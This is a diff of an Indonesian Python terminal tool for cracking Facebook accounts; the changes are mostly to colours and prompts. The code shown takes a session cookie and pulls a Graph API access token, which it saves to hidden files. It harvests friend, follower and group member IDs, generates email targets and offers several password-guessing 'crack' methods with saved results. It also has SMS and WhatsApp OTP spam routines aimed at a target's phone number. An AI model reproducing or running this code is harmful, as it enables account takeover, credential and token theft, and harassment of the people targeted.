@@ -187,22 +187,22 @@ def banner():
 def login123():
 	os.system('clear')
 	banner()
-	cetak(panel(f"[01] Login Menggunakan Cookies [[bold green] ON [bold white]]\n[02] Doa Sebelum Crack [[bold green] ON [bold white]]\n[03] Cara Mengambil Cookies Facebook [[bold green] ON [bold white]]\n[04] Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Login",padding=(0,2),style=f"bold white"))
-	cetak(panel(f'Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi",style=f"bold white"))
-	vevek = input(f' [+] Pilih Menu : ')
+	cetak(panel(f"{P}[{H}01{P}] \33[1;96m Login Menggunakan Cookies [[bold green] ON [bold white]]\n{P}[{H}02{P}] \33[1;96m Doa Sebelum Crack [[bold green] ON [bold white]]\n{P}[{H}03{P}] \33[1;96m Cara Mengambil Cookies Facebook [[bold green] ON [bold white]]\n{P}[{H}04{P}] \33[1;96m Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Login",padding=(0,2),style=f"bold white"))
+	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi",style=f"bold white"))
+	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
 	if vevek in ['1','01']:
 		login_lagi334()
 	elif vevek in ['2','02']:
 		doa_halal()
 	elif vevek in ['3','03']:
-		cetak(panel(f"Anda Akan Di Arahkan Ke Youtube Dan Liat Lah Dengan Mata Kepala Anda Sendiri Bagaimana Mengambil Cookies Yang Benar Dan Ikut Tutorial Nya",width=90,title=f"[bold green]Cookies Facebook",padding=(0,3),style=f"bold white"))
+		cetak(panel(f"[bold cyan]Anda Akan Di Arahkan Ke Youtube Dan Liat Lah Dengan Mata Kepala Anda Sendiri Bagaimana Mengambil Cookies Yang Benar Dan Ikut Tutorial Nya",width=90,title=f"[bold green]Cookies Facebook",padding=(0,3),style=f"bold white"))
 		os.system("xdg-open https://youtu.be/iPs-ShFVOJA")
 		time.sleep(3)
 		exit()
 	elif vevek in ['4','04']:
 		result()
 	else:
-		print(' [+] Pilih Yang Bener Asu ')
+		print(' {P}[{H}+{P}] \33[1;91mPilih Yang Bener Asu ')
 		time.sleep(5)
 		back()
 		
@@ -219,7 +219,7 @@ def login():
 		except KeyError:
 			login123()
 		except requests.exceptions.ConnectionError:
-			li = ' [+] Problem Internet Connection, Check And Try Again'
+			li = ' {P}[{H}+{P}]\33[1;91m Problem Internet Connection, Check And Try Again'
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
@@ -228,8 +228,8 @@ def login():
 		
 def login_lagi334():
 	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,style=f"bold white"))
-		your_cookies = input(' [+] Cookie Facebook : ')
+		cetak(nel('{P}[{H}+{P}] \33[1;96mDisarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account Facebook',width=90,style=f"bold white"))
+		your_cookies = input(' {P}[{H}+{P}]\33[1;96m Cookie Facebook : {P}')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -241,7 +241,7 @@ def login_lagi334():
 				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
 				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
 				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
-					print(" [+] Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
+					print(" {P}[{H}+{P}] \33[1;91m Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
 				else:
 					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
 					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
@@ -273,12 +273,12 @@ def login_lagi334():
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n [+] Token : {access_token}")
+							print(f"\n {P}[{H}+{P}]\33[1;96m Token : {access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\ [+] Login Berhasil | python run.py");exit()
+							print("\ {P}[{H}+{P}] \33[1;96mLogin Berhasil [bold green]python run.py");exit()
 			except Exception as e:
-				print(" [+] Cookies Tidak Dapat Di Akses")
+				print(" {P}[{H}+{P}]\33[1;91m Cookies Tidak Dapat Di Akses")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
 				print(e)
 				time.sleep(3)
@@ -291,7 +291,7 @@ def menu(my_name,my_id):
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
-		print(' [+] Cookies Kadaluarsa ')
+		print(' {P}[{H}+{P}]\33[1;91m Cookies Kadaluarsa ')
 		time.sleep(5)
 		login()
 	os.system('clear')
@@ -323,27 +323,27 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in('10','10'):
 		spam_sms()
 	elif _____xyzon___xd____ in('11','11'):
-		cetak(panel(f"Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold white"))
+		cetak(panel(f"\33[1;96mApapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold green]Report Bug",padding=(0,3),style=f"bold cyan"))
 		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
 		time.sleep(3)
 		exit()
 	elif _____xyzon___xd____ in('0','00'):
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
-		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
+		print(f' {P}[{H}+{P}]{m}Sukses Logout{x}')
 		time.sleep(5)
 		login()
 	else:
-		print(' [+] Pilih Yang Bener Asu ')
+		print(' {P}[{H}+{P}]\33[1;91m Pilih Yang Bener Asu ')
 		back()
 def error():
-	print(f' [+] Maaf Fitur Ini Masih Di Perbaiki')
+	print(f' {P}[{H}+{P}]\33[1;91m Maaf Fitur Ini Masih Di Perbaiki')
 	time.sleep(4)
 	back() 
 #-------------------[ DOA HALAL ]-----------------------#
 def doa_halal():
-	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : [bold white]  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
-{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : [bold white]Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='bold white'))
+	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : [bold cyan]  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
+{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : [bold cyan]Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',title=f'{P2} {H2}[ {K2}Doa Sebelum Crack {H2}]',subtitle_align='center',padding=1,style='bold white'))
 #------------------[ DEFF SPAM SMS ]-------------------#
 
 agent = random.choice(
@@ -363,13 +363,13 @@ def process_data1():
 	
 def spam_sms():
 	global nomor 
-	cetak(panel(f''' Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
+	cetak(panel(f'''  \33[1;96mMasukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
+	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
 		while True:
-			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
+			for _ in track(range(100), description=f' {P}[{H}+{P}]\33[1;96m Sedang Spam...'):process_data1()
 			sxp_sms()
 
 class sxp_sms:
@@ -725,13 +725,13 @@ class sxp_sms:
     
 def spam_wa():
 	global nomor
-	cetak(panel(f'''   Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
-	nomor = input(f" [+] Input No Hp : +62").replace("+62","")
+	cetak(panel(f''' \33[1;96m  Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
+	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
 	if nomor == "":
 		pass
 	else:
 		while True:
-			for _ in track(range(100), description=f' [+] Sedang Spam...'):process_data1()
+			for _ in track(range(100), description=f' {P}[{H}+{P}]\33[1;96m Sedang Spam...'):process_data1()
 			sxp_wa()
 			
 class sxp_wa:
@@ -874,7 +874,7 @@ class sxp_wa:
 		self.wa_otp_4(nomor)
 		self.wa_otp_5(nomor)
 		self.wa_otp_6(nomor)
-		cetak(panel(f" Sukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold white"))
+		cetak(panel(f" \33[1;96mSukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold white"))
 	
 ###----------[ DUMP PENGIKUT ]---------- ###
 def pengikut():
@@ -884,24 +884,24 @@ def pengikut():
 	except IOError:
 		exit()
 	ses = requests.Session()
-	cetak(panel(f"[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,padding=(0,7),style=f"bold white"))
-	akun = console.input(f' [+] Masukan Id Target : ')
+	cetak(panel(f"[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,padding=(0,7),style=f"bold white"))
+	akun = console.input(f' {P}[{H}+{P}] \33[1;96mMasukan Id Target : {P}')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:
 			    id.append(pi['id']+'|'+pi['name'])
-			    sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			    sys.stdout.write(f"\r {P}[{H}+{P}] \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
 			    time.sleep(0.0002)
 			except:continue
 		print("\r")
-		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
+		cetak(panel(f"\33[1;96mBerhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(f" [+] Koneksi Internet Anda Bermasalah")
+		print(f" {P}[{H}+{P}] \33[1;91mKoneksi Internet Anda Bermasalah")
 		time.sleep(3);exit()
 	except (KeyError,IOError):
-		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
+		print(f" {P}[{H}+{P}] \33[1;91mGagal Dump Id, Kemungkinan Akun Private")
 		time.sleep(3);exit()
 
 #----------------------[ CRACK USERNAME ]----------------------#
@@ -909,8 +909,8 @@ def crack_nama():
 	nama = []
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
-	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
-	nam = console.input(f' [+] Masukan Nama : ').split(",")
+	cetak(panel(f"  \33[1;96m  Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
+	nam = console.input(f' {P}[{H}+{P}] \33[1;96mMasukan Nama : {P}').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -937,7 +937,7 @@ def cari_nama(link):
 			else:id.append(bo)
 	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
 	if(link):
-	  sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
+	  sys.stdout.write(f"\r\33[1;96m  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
 	  time.sleep(0.0000003)
 	  cari_nama(link)
 	else:
@@ -949,18 +949,18 @@ def crack_email():
 	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
-	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
-	nama = console.input(f' [+] Masukan Nama Target : ')
+	cetak(nel(f'\33[1;96mMasukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
+	nama = console.input(f' {P}[{H}+{P}]\33[1;96m Masukan Nama Target : {P}')
 	if ',' in str(nama):
-		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
+		print(f" {P}[{H}+{P}] \33[1;91mMasukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
-	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
-	doma = console.input(f' [+] Masukan Nama Domain : ')
+	cetak(nel(f'\33[1;96mMasukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
+	doma = console.input(f' {P}[{H}+{P}]\33[1;96m Masukan Nama Domain : {P}')
 	if '@' not in str(doma) or '.com' not in str(doma):
-		print(f" [+] Masukan Domain Dengan Benar")
+		print(f" {P}[{H}+{P}]\33[1;91m Masukan Domain Dengan Benar")
 		time.sleep(3);exit()
-	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
-	jumlah = console.input(f' [+] Total Dump : ')
+	cetak(nel(f'\33[1;96mMax 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
+	jumlah = console.input(f' {P}[{H}+{P}]\33[1;96m Total Dump : ')
 	for xyz in range(int(jumlah)):
 		A = nama
 		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
@@ -969,20 +969,20 @@ def crack_email():
 		if D in id:pass
 		else:id.append(D+'|'+nama)
 		if len(dump)==999999:setting()
-		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+		sys.stdout.write(f"\r  \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
 		time.sleep(0.0000003)
 	print("\r")
 	setting()	
 		
 #-----------------[ CRACK GRUP ]-----------------# 
 def crack_group():
-	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
-	link = input(f' [+] Id Group : ')
+	cetak(nel('\33[1;96m Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
+	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : ')
 	url = "https://mbasic.facebook.com/groups/"+link
 	try:dump_grup(url)
 	except KeyboardInterrupt:atur_atur()
 	if len(dump)==0:
-		exit(f' [+] Gagal Dump Id Grup, Kemungkinan Grup Private')
+		exit(f' {P}[{H}+{P}]\33[1;91m Gagal Dump Id Grup, Kemungkinan Grup Private')
 	setting()
 
 def dump_grup(url):
@@ -996,7 +996,7 @@ def dump_grup(url):
 				else:nama = par.split(" > ")[0]
 				if id+"|"+nama in dump:pass
 				else:dump.append(id+"|"+nama)
-				print(f'\r [+] Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
+				print(f'\r {P}[{H}+{P}]\33[1;96m Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
 		for z in data.find_all("a"):
 			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
 				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
@@ -1005,16 +1005,16 @@ def dump_grup(url):
 		
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
-	kz = input(f'[+]Pilih : ')
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Hasil CP[/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
+	kz = input(f'{P}[{H}+{P}]\33[1;96m Pilih : {P}')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
+			print(' {P}[{H}+{P}]\33[1;91m File Tidak Di Temukan ')
 			time.sleep(3)
 			back()
 		if len(vin)==0:
-			print(' [+] Anda Tidak Memiliki Hasil CP ')
+			print(' {P}[{H}+{P}] \33[1;96mAnda Tidak Memiliki Hasil CP ')
 			time.sleep(4)
 			back()
 		else:
@@ -1035,11 +1035,11 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+]  Pilih Yang Bener Kontol ')
+				print(' {P}[{H}+{P}]\33[1;91m  Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print(' [+] File Tidak Di Temukan ')
+				print(' {P}[{H}+{P}] \33[1;96mFile Tidak Di Temukan ')
 				time.sleep(4)
 				back()
 			nocp=0
@@ -1048,16 +1048,16 @@ def result():
 				cpkuh=f'# +--> {cpkuni[0]} | {cpkuni[1]}'
 				sol().print(mark(cpkuh,style="yellow"))
 				nocp +=1
-			input('[ Klik Enter ]')
+			input('{P}[{H}+{P}]\33[1;96m ENTER')
 			back()
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
+			print(' {P}[{H}+{P}]\33[1;91m File Tidak Di Temukan ')
 			time.sleep(4)
 			back()
 		if len(vin)==0:
-			print(' [+] Anda Tidak Mempunyai File OK ')
+			print(' {P}[{H}+{P}]\33[1;91m Anda Tidak Mempunyai File OK ')
 			time.sleep(4)
 			back()
 		else:
@@ -1075,14 +1075,14 @@ def result():
 				else:
 					lol.update({str(cih):str(isi)})
 					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-			geeh = input('\n [+] Pilih : ')
+			geeh = input('\n {P}[{H}+{P}]\33[1;96m Pilih : {P}')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+] Pilih Yang Bener Kontol ')
+				print(' {P}[{H}+{P}]\33[1;91m Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('OK/'+geh,'r').read().splitlines()
 			except:
-				print(' [+] File Tidak Di Temukan ')
+				print(' {P}[{H}+{P}]\33[1;91m File Tidak Di Temukan ')
 				time.sleep(4)
 				back()
 			nocp=0
@@ -1092,12 +1092,12 @@ def result():
 				sol().print(mark(cpkuh,style="green"))
 				print(f'{hh}USER-AGENT : {x}{cpkuni[2]}')
 				nocp +=1
-			input('[ Klik Enter ]')
+			input('{P}[{H}+{P}]\33[1;96m ENTER')
 			back()
 	elif kz in ['3','03']:
 		back()
 	else:
-		print(' [+] Pilih Yang Bener Kontol ')
+		print(' {P}[{H}+{P}]\33[1;91m Pilih Yang Bener Kontol ')
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def xyzoncrackpublik():
@@ -1106,21 +1106,21 @@ def xyzoncrackpublik():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
-	pil = input(f' [+] Masukan ID Target : ')
+	cetak(panel('\t[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	pil = input(f' {P}[{H}+{P}]\33[1;96m Masukan ID Target :{P} ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
 		print('')
-		print(f' [+] Total ID yang Terkumpul : {h}'+str(len(id)))
+		print(f' {P}[{H}+{P}]\33[1;96m Total ID yang Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print(' [+] Internet Lu Gak Ada Anjing')
+		print(' {P}[{H}+{P}]\33[1;91m Internet Lu Gak Ada Anjing')
 		exit()
 	except (KeyError,IOError):
-		print(' [+] Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
+		print(' {P}[{H}+{P}]\33[1;91m Pertemanan Tidak Publick Atau Cookie And Token Anda Busuk')
 		exit()
 #-------------------[ CRACK-MASAL ]----------------#
 def dump_massal():
@@ -1130,19 +1130,19 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		cetak(panel('            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
-		jum = int(input(f' [+] Mau Berapa Idz Target {x} : '))
+		cetak(panel('            [bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
+		jum = int(input(f' {P}[{H}+{P}]\33[1;96m Mau Berapa Idz Target  :{P} '))
 	except ValueError:
-		print(' [+] Wrong input ')
+		print(' {P}[{H}+{P}]\33[1;91m Wrong input ')
 		exit()
 	if jum<1 or jum>80:
-		print(f'{h} [+] {x}Pertemanan Tidak Publik  ')
+		print(f' {P}[{H}+{P}]\33[1;91m Pertemanan Tidak Publik  ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input(f' {P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		kl = input(f' \33[1;96mMasukan Idz Target Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -1156,25 +1156,25 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print(' [+] Unstable Signal ')
+			print(' {P}[{H}+{P}]\33[1;96m Unstable Signal ')
 			exit()
 	try:
-		print(f' [+] {P}Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
+		print(f' {P}[{H}+{P}]\33[1;96m Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print(' [+] Unstable Signal ')
+		print(' {P}[{H}+{P}]\33[1;96m Unstable Signal ')
 		back()
 	except (KeyError,IOError):
-		print(f' [+] {k} Friendship Not Public {x}')
+		print(f' {P}[{H}+{P}]\33[1;91m Friendship Not Public {x}')
 		time.sleep(3)
 		back()
 
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print('')
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
-	hu = input(f' [+] Pilih Urutan id : ')
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack Idz Old-New [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack Idz Random [[bold green]Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
+	hu = input(f' {P}[{H}+{P}] \33[1;96mPilih Urutan id : {P}')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -1193,10 +1193,10 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' [+] Pilih Yang Bener Kontooll ')
+		print(' {P}[{H}+{P}] \33[1;96mPilih Yang Bener Kontooll ')
 		exit()
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode Mobile  [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode Free [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode B-Api [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Metode Reguler [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold white"))
-	hc = input(f' [+] Pilih Metode : ')
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Metode Mobile  [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Metode Mbasic [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Metode Free [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Metode B-Api [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Metode Async [[bold green]Recommended[bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Metode Reguler [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold white"))
+	hc = input(f' {P}[{H}+{P}] \33[1;96mPilih Metode :{P} ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['2','02']:
@@ -1211,24 +1211,24 @@ def setting():
 	    method.append('reguler')
 	else:
 		method.append('mobile')
-	cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Password Random [[bold green]Recommended[bold white]]
-[bold white][[bold green]02[bold white]] [bold white]Password Otomatis [[bold green]Very Recommended[bold white]]
-[bold white][[bold green]03[bold white]] [bold white]Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
-	pwplus=input(f' [+] {P}Pilih sandi : ')
